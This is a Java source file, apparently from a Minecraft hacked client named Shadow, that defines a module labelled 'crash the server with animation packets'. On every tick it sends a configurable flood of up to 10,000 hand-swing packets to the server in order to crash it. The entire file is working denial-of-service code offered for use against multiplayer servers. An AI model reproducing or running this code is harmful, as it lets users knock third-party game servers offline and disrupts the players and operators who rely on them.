package net.shadow.feature.module;

import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.world.World;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.SliderValue;

public class AnimationCrashModule extends Module {
    static World w;
    final SliderValue repeat = this.config.create("Power", 2000, 1, 10000, 1);

    public AnimationCrashModule() {
        super("Animation", "crash the server with animation packets", ModuleType.CRASH);
    }

    @Override
    public String getVanityName() {
        return this.getName() + "Crash";
    }

    @Override
    public void onEnable() {
        w = Shadow.c.player.clientWorld;
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {
        if (w != Shadow.c.player.clientWorld) {
            this.setEnabled(false);
            return;
        }
        for (int i = 0; i < repeat.getThis(); i++) {
            Shadow.c.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
        }
    }

    @Override
    public void onRender() {

    }
}

